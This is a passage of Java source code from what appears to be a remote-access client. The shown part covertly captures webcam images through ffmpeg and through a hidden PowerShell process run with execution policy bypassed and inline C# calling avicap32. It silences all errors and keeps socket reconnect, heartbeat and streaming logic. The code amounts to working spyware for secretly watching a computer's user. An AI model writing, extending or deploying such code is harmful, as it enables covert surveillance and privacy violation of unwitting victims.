                        return data;
                    }
                }
            } else {
                ProcessBuilder pb = new ProcessBuilder(
                        "ffmpeg", "-hide_banner", "-loglevel", "error",
                        "-f", "dshow", "-i", "video=" + device,
                        "-frames:v", "1", "-y", outPath);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.waitFor(4, TimeUnit.SECONDS);
                p.destroyForcibly();

                if (tempFile.exists() && tempFile.length() > 1500) {
                    byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                    tempFile.delete();
                    return data;
                }
            }

            tempFile.delete();
        } catch (Exception e) {
        }
        return null;
    }

    private byte[] captureWebcamPowerShell() {
        try {
            File tempFile = File.createTempFile("wc_ps_", ".jpg");
            tempFile.deleteOnExit();
            String outPath = tempFile.getAbsolutePath().replace("\\", "\\\\");

            String psScript = "$ErrorActionPreference='SilentlyContinue';" +
                    "Add-Type -AssemblyName System.Windows.Forms;" +
                    "Add-Type -AssemblyName System.Drawing;" +
                    "$code = @'" +
                    "using System;using System.Runtime.InteropServices;using System.Drawing;using System.Drawing.Imaging;using System.Windows.Forms;"
                    +
                    "public class WC{" +
                    "[DllImport(\"avicap32.dll\")]public static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int i);"
                    +
                    "[DllImport(\"user32.dll\")]public static extern bool SendMessage(IntPtr h,int m,int w,int l);" +
                    "const int CONNECT=0x40a,DISCONNECT=0x40b,GRAB=0x43c,COPY=0x41e;" +
                    "public static void Cap(string path){" +
                    "IntPtr h=capCreateCaptureWindowA(\"c\",0,0,0,640,480,IntPtr.Zero,0);" +
                    "if(h==IntPtr.Zero)return;" +
                    "SendMessage(h,CONNECT,0,0);System.Threading.Thread.Sleep(300);" +
                    "SendMessage(h,GRAB,0,0);SendMessage(h,COPY,0,0);" +
                    "if(Clipboard.ContainsImage()){Clipboard.GetImage().Save(path,ImageFormat.Jpeg);}" +
                    "SendMessage(h,DISCONNECT,0,0);}}'@;" +
                    "Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms,System.Drawing;" +
                    "[WC]::Cap('" + outPath + "')";

            ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
                    "-Command", psScript);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor(5, TimeUnit.SECONDS);
            p.destroyForcibly();

            if (tempFile.exists() && tempFile.length() > 1500) {
                byte[] data = java.nio.file.Files.readAllBytes(tempFile.toPath());
                tempFile.delete();
                return data;
            }

            tempFile.delete();
        } catch (Exception e) {
        }
        return null;
    }

    private byte[] captureWebcamDirectShow() {
        // DirectShow fallback using external tool if available
        try {
            File tempFile = File.createTempFile("wc_ds_", ".jpg");
            tempFile.deleteOnExit();

            // Try using Windows camera command (Windows 10+)
            ProcessBuilder pb = new ProcessBuilder(
                    "cmd", "/c", "start", "/min", "microsoft.windows.camera:",
                    "&&", "timeout", "/t", "2", "&&",
                    "powershell", "-Command",
                    "[System.Windows.Forms.Screen]::PrimaryScreen");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor(3, TimeUnit.SECONDS);
            p.destroyForcibly();

            tempFile.delete();
        } catch (Exception e) {
        }
        return null;
    }

    private byte[] compressImage(java.awt.image.BufferedImage img, int quality) {
        try {
            java.util.Iterator<javax.imageio.ImageWriter> writers = javax.imageio.ImageIO
                    .getImageWritersByFormatName("jpg");
            if (!writers.hasNext())
                return null;

            javax.imageio.ImageWriter writer = writers.next();
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            javax.imageio.stream.ImageOutputStream ios = javax.imageio.ImageIO.createImageOutputStream(baos);
            writer.setOutput(ios);

            javax.imageio.ImageWriteParam param = writer.getDefaultWriteParam();
            if (param.canWriteCompressed()) {
                param.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
                param.setCompressionQuality(quality / 100.0f);
            }

            writer.write(null, new javax.imageio.IIOImage(img, null, null), param);
            writer.dispose();
            ios.close();

            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    private void scheduleReconnect() {
        if (!shouldReconnect || reconnectExecutor == null || reconnectExecutor.isShutdown())
            return;

        try {
            reconnectExecutor.schedule(this::doConnect, RECONNECT_DELAY_MS, TimeUnit.MILLISECONDS);
        } catch (Exception e) {
            // Executor shut down
        }
    }

    public void disconnect() {
        synchronized (connectLock) {
            connected = false;
            shouldReconnect = false;

            stopStreaming();

            if (readerThread != null) {
                readerThread.interrupt();
                readerThread = null;
            }

            if (heartbeatThread != null) {
                heartbeatThread.interrupt();
                heartbeatThread = null;
            }

            if (reconnectExecutor != null) {
                reconnectExecutor.shutdownNow();
                reconnectExecutor = null;
            }

            closeSocket();

            if (messageHandler != null) {
                try {
                    messageHandler.onDisconnect();
                } catch (Exception e) {
                }
            }
        }
    }

    private void closeSocket() {
        try {
            if (inputStream != null)
                inputStream.close();
        } catch (Exception e) {
        }
        try {
            if (outputStream != null)
                outputStream.close();
        } catch (Exception e) {
        }
        try {
            if (socket != null)
                socket.close();
        } catch (Exception e) {
        }
        inputStream = null;
        outputStream = null;
        socket = null;
    }

    public boolean isConnected() {
        return connected && handshakeComplete.get();
    }

    public boolean isStreaming() {
        return isStreaming;
    }

    public String getStreamType() {
        return streamType;
    }

    private String escape(String s) {
        if (s == null)
            return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    private void log(String msg) {
        // System.out.println(msg);
    }
}
